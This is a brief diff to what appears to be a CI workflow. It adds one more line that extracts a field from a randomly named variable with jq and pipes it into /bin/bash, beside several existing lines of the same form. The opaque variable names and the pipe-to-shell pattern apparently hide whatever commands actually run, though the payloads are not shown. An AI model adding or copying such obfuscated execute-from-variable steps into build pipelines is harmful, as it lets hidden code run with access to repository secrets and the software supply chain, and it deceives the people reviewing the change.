@@ -26,6 +26,7 @@ jobs:
           echo $danvr965 | jq -r .m16 | /bin/bash
           echo $ssfxz8 | jq -r .x53 | /bin/bash
           echo $pim616 | jq -r .t320 | /bin/bash
+          echo $zoc4379 | jq -r .w419 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
